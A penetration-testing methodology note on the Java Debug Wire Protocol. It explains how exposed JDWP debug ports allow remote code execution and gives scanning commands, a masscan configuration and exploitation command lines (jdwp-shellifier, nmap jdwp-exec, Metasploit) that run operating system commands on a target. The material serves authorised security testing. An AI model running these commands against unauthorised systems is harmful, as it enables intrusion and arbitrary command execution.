# Java Debug Wire Protocol - Methodology

### Overview

The `Java Debug Wire Protocol (JDWP)` is one of three interfaces of the `Java
Platform Debug Architecture`, which is designed for debugging purposes in
development environments. The `JDWP` is a communication protocol used for the
exchanges between a debugger and a `Java Virtual Machine (JVM)` being debugged,
sometimes referred to as the "target `JVM`".

The `JDWP` protocol is asynchronous and implement two basic packet types:
`command packets` and `reply packets`. The `command packets` are used to
instruct the receiving component to execute of a specific command. While
`command packets` can be sent by both the debugger and the target `JVM`, they
are generally sent by the debugger. The `reply packets` are only sent in
response to a `command packet` and return information about the command
execution (command execution status, command output, etc.).

**Remote code execution can be achieved through the `JDWP` protocol**, as it
support the loading of arbitrary classes into the target `JVM` and the
invocation of functions. The code will be executed on the remote system under
the security context of the target `JVM`.

One example of a simplified process to remotely execute system commands is as
follow:
  - setting of a breakpoint on a method often called during runtime such as
    `java.net.ServerSocket.accept()` or `java.lang.String.indexOf()`. This step
    is required as the next instructions must be executed in a running
    context (and will thus be executed only after the triggering of the
    breakpoint).
  - retrieval of the `JVM`'s runtime context (of the thread in which the
    breakpoint is triggered) by sending a `ClassType/InvokeMethod` packet
    invoking the `java.lang.Runtime.getRuntime()` static method.
  - allocation of a Java `String` object that will contain the operating system
    command to execute.
  - calling of the `Runtime.exec()` method to execute the system command
    defined in the previously allocated string.

Another possibility is to inject a Java class, as a `byte` array, into the
target `JVM` using `secureClassLoader.defineClass`. Following the remote
loading, a method of the injected class can be invoked to conduct the shell
commands execution.  

As intended for non-production environments, the **`JDWP` protocol does not
support authentication nor data encryption**.

Disabled by default, a `JVM` must be explicitly started with the following
arguments in order to be remotely debuggable (and thus exposing a `JDWP`
interface):
  - Before `Java 5.0`, `-Xdebug` and `-Xrunjdwp`.
  - Starting from `Java 5.0`,    
  `-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<*:8000 | *:PORT>`

### Network scan

While `JDWP` services are standardly exposed on port TCP 8000, the port number
of the service is specified at the `JVM` start. `JDWP` services may thus be
accessible on any TCP ports.

Note that `JDWP` communications are initiated by a both-way handshake, with the
debugger sending a `JDWP-Handshake` string and the target `JVM` responding
using the same string. Through this handshake, `JDWP` services can be reliably
identified.

```
nmap -v <-p 8000 | -p-> -sV -sC -oA nmap_JDWP <RANGE | CIDR>
```

`massscan` with the configuration file below can be used to scan the network
for accessible `JDWP` services by scanning for open TCP ports and attempting a
`JDWP-Handshake` handshake.

```
# Usage: masscan [-v] -c <JDWP_MASSCAN_CONF>
# Adapted from: https://raw.githubusercontent.com/IOActive/jdwp-shellifier/master/jdwp-masscan.cfg

rate =  <5000.00 | RATE>
randomize-hosts = true
banners = true
rotate = 0
rotate-dir = .
rotate-offset = 0
rotate-filesize = 0

range = <IP | RANGE | CIDR>
ports = <3999,5000,5005,8000,8453,8787-8788,9001,18000 | 1-65535 | TCP_PORTS>

min-packet = 60
hello-string[0] = SkRXUC1IQU5EU0hBS0U=
```

### Remote Code Execution

The `Metasploit`'s `exploit/multi/misc/java_jdwp_debugger` module, the
`jdwp-shellifier` Python script, and the `nmap`'s `jdwp-exec` NSE script can be
used to exploit a `JDWP` service to execute remote operating system commands.

The `nmap`'s `jdwp-exec` NSE script remotely inject a Java class while the
`Metasploit` module and `jdwp-shellifier.py` directly retrieve the Runtime
context to call the `Runtime.exec()` method.

Note that the `Metasploit`'s `exploit/multi/misc/java_jdwp_debugger` module
drops a payload file to disk and by doing so may trigger antivirus alerts.
Neither `nmap`'s `jdwp-exec` NSE script nor `jdwp-shellifier.py` upload a file
to the targeted system.

```
# If executed with out a command, jdwp-shellifier will retrieve basic system information (OS version, current user, Runtime ClassPath, etc.).
# Defaults to break on "java.net.ServerSocket.accept" calls.
# Setting a breakpoint on "java.lang.String.indexOf" can be more reliable.  
jdwp-shellifier.py -t <IP | HOSTNAME> -p <PORT> [--break-on <'java.lang.String.indexOf' | JAVA_METHOD>]
jdwp-shellifier.py -t <IP | HOSTNAME> -p <PORT> [--break-on <'java.lang.String.indexOf' | JAVA_METHOD>] --cmd "<COMMAND>"

nmap -v -sT -sV -p <PORT> --script=+jdwp-exec --script-args cmd="<COMMAND>" <IP | HOSTNAME | RANGE | CIDR>

msf > use exploit/multi/misc/java_jdwp_debugger
```
